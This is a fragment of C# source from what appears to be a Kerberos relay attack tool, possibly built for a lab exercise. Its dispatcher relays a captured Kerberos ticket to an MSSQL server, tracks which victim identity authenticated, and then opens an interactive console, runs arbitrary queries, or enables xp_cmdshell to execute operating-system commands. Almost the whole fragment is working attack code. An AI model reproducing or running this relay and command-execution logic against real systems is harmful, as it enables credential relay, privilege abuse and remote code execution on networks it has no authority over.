        public override long Position { get => throw new NotSupportedException(); set => throw new NotSupportedException(); }
        public override long Seek(long o, SeekOrigin r) => throw new NotSupportedException();
        public override void SetLength(long v) => throw new NotSupportedException();
    }

    // ----------------------------------------------------------------------
    // Dispatcher, mirroring Clients/Smb.cs. Called from
    // AcceptSecurityContext_kerb() with the relayed AP-REQ in Program.ticket.
    // ----------------------------------------------------------------------
    public class Mssql
    {
        // How many distinct inbound authentications we've tried to relay.
        private static int _attempt = 0;

        // Reset the Kerberos leg-state so the NEXT inbound authentication starts
        // cleanly at LOGIN7 (leg 1) instead of being treated as a continuation
        // of the previous (failed) one.
        private static void ResetForNextAuth()
        {
            try { tdsClient.Disconnect(); } catch { }
            apRep1 = new byte[0];
            apRep2 = new byte[0];
        }

        public static void Connect()
        {
            _attempt++;
            bool continuation = apRep1.Length != 0; // mid mutual-auth (leg 3), same principal

            // Lazy / fresh connection. Each NEW authentication gets its own TDS
            // session, so a stray failed login (e.g. a t.ellis callback) can't
            // poison the next one (e.g. k.asante's).
            if (!tdsClient.Connected)
            {
                if (!continuation)
                    Console.WriteLine("[*] === inbound authentication #{0}: relaying to MSSQL ===", _attempt);
                tdsClient = new TdsClient();
                if (!tdsClient.Connect(targetFQDN, mssqlPort))
                {
                    Console.WriteLine("[-] MSSQL: could not establish TDS session to {0}:{1}", targetFQDN, mssqlPort);
                    return;
                }
            }

            byte[] response = tdsClient.Login(ticket, out bool success);
            if (!success)
            {
                if (response != null && response.Length > 0)
                {
                    // Mutual-auth continuation: keep the socket and feed the server
                    // SSPI token (AP-REP) back to the victim; the next leg reuses it.
                    apRep1 = response;
                    Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToString(apRep1));
                }
                else
                {
                    // SQL named the principal in the 18456 error above - that tells
                    // you WHICH identity this inbound auth carried (t.ellis vs k.asante).
                    Console.WriteLine("[-] This inbound authentication has no MSSQL login (rejected). " +
                                      "See the principal named in the error above.");
                    ResetForNextAuth();
                    Console.WriteLine("[*] Waiting for another inbound authentication to relay...");
                }
            }
            else
            {
                // Successful Kerberos context. Confirm WHICH principal it was.
                string who = null, whoSid = null;
                try { who = tdsClient.WhoAmI(); } catch { }
                try { whoSid = tdsClient.WhoAmISid(); } catch { }
                Console.WriteLine("[+] MSSQL session established - authenticated as: {0}  (SID {1})",
                    string.IsNullOrEmpty(who) ? "(unknown)" : who,
                    string.IsNullOrEmpty(whoSid) ? "?" : whoSid);

                try
                {
                    if (attacks.Keys.Contains("console"))
                    {
                        tdsClient.Console_();
                    }
                    else if (attacks.Keys.Contains("query"))
                    {
                        tdsClient.Query(attacks["query"]);
                    }
                    else if (attacks.Keys.Contains("mssql-exec"))
                    {
                        string cmd = attacks["mssql-exec"].Replace("'", "''");
                        Console.WriteLine("[*] Enabling xp_cmdshell and running: {0}", attacks["mssql-exec"]);
                        tdsClient.Query(
                            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; " +
                            "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
                        tdsClient.Query("EXEC xp_cmdshell '" + cmd + "';");
                    }
                    else
                    {
                        // default: confirm who we are and whether we are sysadmin
                        tdsClient.Query(
                            "SELECT SYSTEM_USER AS login_name, " +
                            "ORIGINAL_LOGIN() AS original_login, " +
                            "IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;");
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }

                tdsClient.Disconnect();
                Environment.Exit(0);
            }
        }
    }
}
